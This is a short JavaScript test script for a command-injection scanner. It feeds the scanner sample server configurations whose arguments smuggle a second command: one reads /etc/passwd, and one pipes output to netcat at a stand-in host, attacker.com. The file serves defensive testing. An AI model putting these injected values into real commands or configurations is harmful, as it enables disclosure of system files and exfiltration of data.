const { CommandInjectionScanner } = require('./packages/core/dist/index.js');

async function test() {
  const scanner = new CommandInjectionScanner();
  
  // Test 1: Semicolon command chaining
  const config1 = {
    command: 'node',
    args: ['server.js', '; cat /etc/passwd'],
    metadata: { name: 'test-server' }
  };
  
  const vulns1 = await scanner.scan(config1);
  console.log('Test 1 - Semicolon chaining:');
  vulns1.forEach(v => console.log(`  - ${v.severity}: ${v.title}`));
  
  // Test 2: Pipe operator
  const config2 = {
    command: 'echo',
    args: ['test | nc attacker.com 1234'],
    metadata: { name: 'test-server' }
  };
  
  const vulns2 = await scanner.scan(config2);
  console.log('\nTest 2 - Pipe operator:');
  vulns2.forEach(v => console.log(`  - ${v.severity}: ${v.title}, details:`, v.details));
}

test();